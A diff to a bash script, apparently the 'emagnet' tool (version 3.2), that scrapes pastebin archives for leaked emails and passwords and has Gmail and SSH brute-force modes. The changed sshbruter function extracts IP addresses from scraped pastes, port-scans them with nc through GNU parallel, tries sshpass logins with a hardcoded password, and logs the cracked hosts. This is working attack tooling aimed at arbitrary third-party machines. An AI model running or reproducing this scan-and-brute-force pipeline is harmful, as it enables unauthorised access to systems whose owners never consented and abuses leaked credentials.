@@ -115,6 +115,7 @@ fi
 }
 
 mustbefilled() {
+source $CONF
 if [[ -z $DEBUG          ]];   then sed -i "12d"  $CONF;sed -i '12  i DEBUG=false'                                                                                                             $CONF;fi
 if [[ -z $PASTEBIN       ]];   then sed -i '21d'  $CONF;sed -i '21  i PASTEBIN=https:\/\/www.pastebin.com\/archive'                                                                            $CONF;fi
 if [[ -z $WIP            ]];   then sed -i '50d'  $CONF;sed -i '50  i WIP=https:\/\/nr1.nu\/i\/'                                                                                               $CONF;fi
@@ -131,7 +132,7 @@ if [[ -z $EMAGNETARCHIVE ]];   then sed -i "79d"  $CONF;sed -i '79  i EMAGNETARC
 if [[ -z $EMAGNETDB      ]];   then sed -i "80d"  $CONF;sed -i '80  i EMAGNETDB=$EMAGNETHOME\/email-files'                                                                                     $CONF;fi
 if [[ -z $EMAGNETBACKUP  ]];   then sed -i "81d"  $CONF;sed -i '81  i EMAGNETBACKUP=$EMAGNET/backup'                                                                                           $CONF;fi
 if [[ -z $EMAGNETSYNTAX  ]];   then sed -i "82d"  $CONF;sed -i '82  i EMAGNETDB=$EMAGNETHOME\/sorted-by-syntax'                                                                                $CONF;fi
-if [[ -z $VERSION        ]];   then sed -i '91d'  $CONF;sed -i '91  i VERSION=3.1'                                                                                                             $CONF;fi
+if [[ -z $VERSION        ]];   then sed -i '91d'  $CONF;sed -i '91  i VERSION=3.2'                                                                                                             $CONF;fi
 if [[ -z $THREADS        ]];   then sed -i '100d' $CONF;sed -i "100 i THREADS=1"                                                                                                               $CONF;fi
 if [[ -z $IDLETIME       ]];   then sed -i '109d' $CONF;sed -i "109 i IDLETIME=3600"                                                                                                           $CONF;fi
 if [[ -z $GBRUTEFORCE    ]];   then sed -i '118d' $CONF;sed -i '118 i GBRUTEFORCE=false'                                                                                                       $CONF;fi
@@ -140,7 +141,7 @@ if [[ -z $EMAIL2SEND     ]];   then sed -i '128d' $CONF;sed -i '128 i EMAIL2SEND
 if [[ -z $NOTIFY         ]];   then sed -i '137d' $CONF;sed -i '137 i NOTIFY=false'                                                                                                            $CONF;fi
 if [[ -z $SSHUSER        ]];   then sed -i '168d' $CONF;sed -i '168 i SSHUSER="root"'                                                                                                          $CONF;fi
 if [[ -z $SSHPORT        ]];   then sed -i '169d' $CONF;sed -i '169 i SSHPORT="22"'                                                                                                            $CONF;fi
-if [[ -z $SSHPASS        ]];   then sed -i '170d' $CONF;sed -i '170 i SSHWORDLIST=""'                                                                                                          $CONF;fi
+if [[ -z $SSHPASS        ]];   then sed -i '170d' $CONF;sed -i '170 i SSHPASS=""'                                                                                                          $CONF;fi
 if [[ -z $SSHTARGETS     ]];   then sed -i '171d' $CONF;sed -i '171 i SSHTARGETS="/tmp/.emagnet-sshbruter.txt"'                                                                                $CONF;fi
 if [[ -z $SSHPORTSCAN    ]];   then sed -i '172d' $CONF;sed -i '172 i SSHPORTSCAN="/tmp/.emagnet-portscan"'                                                                                    $CONF;fi
 if [[ -z $VPN            ]];   then sed -i '149d' $CONF;sed -i '149 i VPN=false'                                                                                                               $CONF;fi
@@ -151,6 +152,7 @@ if [[ -z $VPNPROVIDER3   ]];   then sed -i '153d' $CONF;sed -i '153 i VPNPROVIDE
 if [[ -z $VPNCOUNTRYS    ]];   then sed -i '154d' $CONF;sed -i '154 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'   $CONF;fi
 if [[ -z $VPNCOUNTRYS2   ]];   then sed -i '155d' $CONF;sed -i '155 i VPNCOUNTRYS2="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  $CONF;fi
 if [[ -z $VPNCOUNTRYS3   ]];   then sed -i '156d' $CONF;sed -i '156 i VPNCOUNTRYS3="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  $CONF;fi
+source $CONF
 }
 
 paths() {
@@ -305,7 +307,10 @@ else
      printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
      printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
      sleep 5
-fi;fi;fi;fi
+fi
+fi
+fi
+fi
 }
 
 checkip() {
@@ -380,9 +385,9 @@ if [[ $GBRUTEFORCE = "true" ]]; then
     clear; banner;printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
     printf "\n%64s \n" | tr ' ' '=';echo "";analyzer
 elif [[ $SBRUTEFORCE = "true" ]]; then
-    clear;banner;printf "%19s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n";printf "\n%64s \n" | tr ' ' '=';echo "";analyzer
-else sed -i '121d' $CONF; sed -i '121 i GBRUTEFORCE=false' $CONF
-	 sed -i '121d' $CONF; sed -i '122 i SBRUTEFORCE=false' $CONF
+    clear;banner;printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n";printf "\n%64s \n" | tr ' ' '=';echo "";analyzer
+else sed -i '121d' $CONF; sed -i '118 i GBRUTEFORCE=false' $CONF
+	 sed -i '121d' $CONF; sed -i '119 i SBRUTEFORCE=false' $CONF
 	 source /etc/emagnet.conf;analyzer;fi
 }
 
@@ -477,13 +482,27 @@ printf "\n%64s \n\n" | tr ' ' '='
 }
 
 sshbruter() {
+if [[ $SSHPASS = "root" ]]; then
+   echo -e "You must set a password to use during the attack"
+   read -p "Enter a password or hit enter for default (Default: root) " sshpassb
+     if [[ -n $sshpassb ]]; then
+     sed -i '170d' $CONF
+     sed -i "170 i SSHPASS=$sshpassb" $CONF
+     else
+     sleep 0
+     fi
+fi
+
+
 SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.*\|^11.*"
-grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /opt/emagnet/incoming/2019-07-17/all-files\
+grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNETHOME/.temp\
 |awk -F':' '{print $2}'\
 |sort\
-|grep -v $SKIPLIST > $SSHPORTSCAN
+|grep -v $SKIPLIST\
+|awk -F, '!seen[$1]++'> $SSHPORTSCAN
+
     clear;banner;
-    echo -e "                 PORTSCANNING - BRUTEFORCING"
+    echo -e "                  PORTSCANNING - BRUTEFORCING"
     printf "\n%64s" | tr ' ' '='
     printf "\nPort/Brute attack will be started within 2 seconds..............\n"
     printf "Please use (CTRL+C) to abort the scan at anytime................\n"
@@ -491,11 +510,11 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /opt/emagnet/incoming/2019-07-17/al
     sleep 2
     parallel -j32 -a /tmp/.emagnet-portscan '\
 timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee $SSHTARGETS 2>&1 grep open && \
-timeout 1 sshpass -p "odemnn" ssh -v "-o StrictHostKeyChecking=no" wuseman@{} pwd 2>&1 grep "Authenticated to" &> /dev/null
+timeout 1 sshpass -p "root" ssh -v "-o StrictHostKeyChecking=no" wuseman@{} pwd 2>&1 grep "Authenticated to" &> /dev/null
 if [[ $? -eq "0" ]]; then
-echo -e "[\e[1;32m>>\e[0m] - Found password: root@{}"
+echo -e "[\e[1;32m>>\e[0m] - Found password for: root@{}"
 else
-echo -e "[\e[\e[1;31m<<\e[0m] - Wrong password: root@{}"
+echo -e "[\e[\e[1;31m<<\e[0m] - Wrong password for: root@{}"
 fi
 #echo -e "[\e[1;32mopen..\e[0m] - {}:22" || \
 #echo -e "[\e[1;31mclosed\e[0m] - {}:22"' 
@@ -508,10 +527,10 @@ if [[ $? -eq "0" ]]; then
     echo -e "[+] Password: $SSHPASS"                                               >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
     echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
 else
-    echo -e "[\e[1;31m<<\e[0m] - Wrong password: root@{}"
     echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS access on: {}:22" >> $EMAGNETLOGS/failed-2-crack.txt
 fi
     rm $SSHPORTSCAN $SSHTARGETS &> /dev/null
+    sleep 2
 }
 
 bruter() {
@@ -781,7 +800,15 @@ elif [[ $SBRUTEFORCE = "true" ]]; then printf "%64s \n\n" | tr ' ' '=';sshbruter
 cp -rn $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null;elif [[ $pt = "00" ]] && [[ $it -gt "00" ]]; then
 echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found \e[1;36m$it\e[0m  emails from ${i##*/}"    | xargs >> $EMAGNETLOGS/emagnet.log
 grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP| cut -d: -f2 |uniq >> $EMAGNETLOGS/emails-from-pastebin.txt
-cp $i $EMAGNETDB/ &> /dev/null;mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+sleep 2
+cp $i $EMAGNETDB/ &> /dev/null;
+if [[ $SBRUTEFORCE = "true" ]]; then
+  cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+elif [[ $GBRUTEFORCE = "true" ]]; then
+  cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+else
+  mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+fi
 printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n";printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
 printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
 if [[ $NOTIFY = "true" ]]; then notify-send "Emagnet" "\n$tt - Files downloaded\n 00 - Passwords found\n$it - Email addresses found"; fi;sleep 5
@@ -824,8 +851,8 @@ sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' $CONF
 sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' $CONF
 source $CONF;clear;banner;check4all
 PWD="$(pwd)";if [[ -d "/usr/bin" ]]; then
- if ! [[ -h "/usr/bin/emagnet" ]] || ! [[ -L "/usr/bin/emagnet" ]] ; then
-  cd /usr/bin/;ln -s $PWD/emagnet emagnet;fi;fi
+if ! [[ -h "/usr/bin/emagnet" ]] || ! [[ -L "/usr/bin/emagnet" ]] ; then
+cd /usr/bin/;ln -s $PWD/emagnet emagnet;fi;fi
 if [[ $GBRUTEFORCE = "false" ]]; then dontstopwhenfound
 elif [[ $GBRUTEFORCE = "false" ]]; then dontstopwhenfound
 else mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null;fi
@@ -853,7 +880,7 @@ elif [[ $2 = "ssh" ]]; then
         source $CONF
         if [[ $SBRUTEFORCE = "true" ]]; then
         clear; banner
-        printf "%19s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+        printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
         printf "\n%64s \n\n" | tr ' ' '='
         dontstopwhenfound
         sshbruter
@@ -954,6 +981,7 @@ fi
         printf "[\e[1;32m>>\e[0m] - Config file has been updated, notifications is: \e[1;31mOFF\e[0m\n\n"
      fi
 ;;
+
  "-v"|"-vpn"|"--vpn")
 source $CONF;clear;banner
 if [[ -z $2 ]]; then echo -e "[\e[1;31m<<\e[0m] - emagnet: internal error - vpn require a true/false value..\n";exit 1;fi
